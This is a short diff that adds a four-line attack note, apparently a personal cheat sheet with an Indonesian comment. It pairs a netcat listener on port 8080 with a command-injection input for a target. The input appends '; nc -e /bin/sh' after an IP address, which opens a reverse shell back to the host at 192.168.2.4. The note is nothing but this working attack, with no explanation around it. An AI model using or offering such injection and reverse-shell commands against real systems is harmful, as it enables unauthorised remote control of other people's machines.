@@ -1,0 +1,4 @@
+nc --vv -l -p 8080    --> host
+192.168.2.4 ; nc -e /bin/sh 192.168.2.4 8080    ---> target
+
+192.168.2.4 adalah ip host
